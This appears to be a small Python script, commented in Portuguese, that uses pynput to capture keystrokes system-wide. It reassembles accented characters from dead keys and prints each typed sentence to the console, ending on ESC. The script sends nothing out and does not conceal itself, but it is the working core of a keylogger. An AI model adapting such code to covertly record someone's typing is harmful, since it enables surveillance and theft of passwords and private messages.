from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.current_sentence = ""
        self.dead_key = None
        self.dead_key_map = {
            ("´", "a"): "á", ("´", "e"): "é", ("´", "i"): "í", ("´", "o"): "ó", ("´", "u"): "ú", ("´", "y"): "ý",
            ("`", "a"): "à", ("`", "e"): "è", ("`", "i"): "ì", ("`", "o"): "ò", ("`", "u"): "ù",
            ("~", "a"): "ã", ("~", "o"): "õ", ("~", "n"): "ñ",
            ("^", "a"): "â", ("^", "e"): "ê", ("^", "i"): "î", ("^", "o"): "ô", ("^", "u"): "û",
            ("¨", "u"): "ü", ("¨", "i"): "ï", ("¨", "e"): "ë", ("¨", "a"): "ä", ("¨", "o"): "ö",
            ("'", "c"): "ç",
        }

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                char = key.char

                # Verifica se é uma tecla morta (dead key)
                if char in ['´', '`', '~', '^', '¨', "'"]:
                    self.dead_key = char
                else:
                    if self.dead_key:
                        combo = self.dead_key_map.get((self.dead_key, char.lower()))
                        if combo:
                            self.current_sentence += combo
                        else:
                            # Se não existir no mapa, adiciona os dois
                            self.current_sentence += self.dead_key + char
                        self.dead_key = None
                    else:
                        self.current_sentence += char

                print("\rFrase atual: " + self.current_sentence + " ", end="", flush=True)

            elif key == keyboard.Key.space:
                self.current_sentence += " "
                print("\rFrase atual: " + self.current_sentence + " ", end="", flush=True)

            elif key == keyboard.Key.backspace:
                self.current_sentence = self.current_sentence[:-1]
                print("\rFrase atual: " + self.current_sentence + " ", end="", flush=True)

            elif key == keyboard.Key.enter:
                print(f"\nFrase registrada: {self.current_sentence}")
                self.current_sentence = ""

            elif key == keyboard.Key.esc:
                print("\nEncerrando...")
                return False

        except Exception as e:
            print(f"\n[ERRO] {e}")

    def start(self):
        print("🟢 Keylogger rodando em segundo plano. Pressione ESC para sair.")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()
